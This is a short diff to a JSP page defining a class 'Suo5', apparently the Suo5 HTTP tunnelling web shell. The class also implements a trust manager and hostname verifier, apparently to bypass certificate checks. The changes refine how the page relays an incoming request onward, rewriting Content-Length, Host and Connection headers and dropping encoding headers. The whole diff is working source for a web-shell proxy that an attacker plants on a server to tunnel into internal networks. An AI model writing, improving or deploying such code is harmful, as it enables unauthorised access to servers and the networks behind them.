@@ -1,6 +1,5 @@
 <%@ page import="java.nio.ByteBuffer" %><%@ page import="java.io.*" %><%@ page import="java.net.*" %><%@ page import="java.security.cert.X509Certificate" %><%@ page import="java.security.cert.CertificateException" %><%@ page import="javax.net.ssl.*" %><%@ page import="java.util.*" %><%!
     public static class Suo5 implements Runnable, HostnameVerifier, X509TrustManager {
-
         public static HashMap addrs = collectAddr();
         public static HashMap ctx = new HashMap();
 
@@ -503,14 +502,28 @@
                 ((HttpsURLConnection) conn).setSSLSocketFactory(sslCtx.getSocketFactory());
             }
 
+            byte[] newBody = marshal(dataMap);
             Enumeration headers = request.getHeaderNames();
             while (headers.hasMoreElements()) {
                 String k = (String) headers.nextElement();
-                conn.setRequestProperty(k, request.getHeader(k));
+                if (k.equals("Content-Length")) {
+                    conn.setRequestProperty(k, String.valueOf(newBody.length));
+                    continue;
+                } else if (k.equals("Host")) {
+                    conn.setRequestProperty(k, u.getHost());
+                    continue;
+                } else if (k.equals("Connection")) {
+                    conn.setRequestProperty(k, "close");
+                    continue;
+                } else if (k.equals("Content-Encoding") || k.equals("Transfer-Encoding")) {
+                    continue;
+                } else {
+                    conn.setRequestProperty(k, request.getHeader(k));
+                }
             }
 
             OutputStream rout = conn.getOutputStream();
-            rout.write(marshal(dataMap));
+            rout.write(newBody);
             rout.flush();
             rout.close();
             conn.getResponseCode();
